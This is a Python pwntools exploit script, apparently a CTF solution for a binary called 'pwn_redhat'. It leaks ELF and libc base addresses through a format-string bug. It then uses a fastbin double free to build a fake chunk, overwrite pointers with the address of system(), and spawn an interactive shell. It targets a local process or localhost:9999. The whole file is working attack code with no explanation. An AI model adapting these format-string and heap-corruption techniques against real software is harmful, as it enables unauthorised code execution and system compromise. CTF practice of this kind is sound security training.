#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./pwn_redhat")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    #  io = process("./pwn_redhat")
    #  io = process("./pwn_redhat_patch_2free")
    io = process("./pwn_redhat_patch_printf")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def touch(size, content):
    io.sendlineafter(">>>", "touch")
    io.sendlineafter(":", str(size))
    io.sendlineafter(":", content)

def rm(idx):
    io.sendlineafter(">>>", "rm")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    #  DEBUG()
    io.sendlineafter(">>>", "%8$p..%9$p..")
    elfBase = int(io.recvuntil("..", drop = True), 16) - 0x13C0
    success("elfBase -> {:#x}".format(elfBase))
    libc.address = int(io.recvuntil("..", drop = True), 16) - 241 - libc.sym[u'__libc_start_main']
    success("libc.address -> {:#x}".format(libc.address))
    pause()

    fakeChunk = 0x202000 - 8 + 2 + elfBase
    success("fakeChunk -> {:#x}".format(fakeChunk))
    touch(0x10, '0000000')
    touch(0x10, '1111111')
    rm(0) # 0
    rm(1) # 0 -> 1
    rm(0) # 0 -> 1 -> 0

    touch(0x10, p64(fakeChunk)) # 1 -> 0 -> fakeChunk
    touch(0x10, '1111111') # 0 -> fakeChunk
    touch(0x10, '/bin/sh\0') # fakeChunk
    #  payload = 'aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeegggggggg'
    #  DEBUG()
    payload = '\0' * (8 + 6) + p64(libc.sym[u'system']) * 3
    touch(0x10, payload)

    rm(0)

    io.interactive()
    io.close()
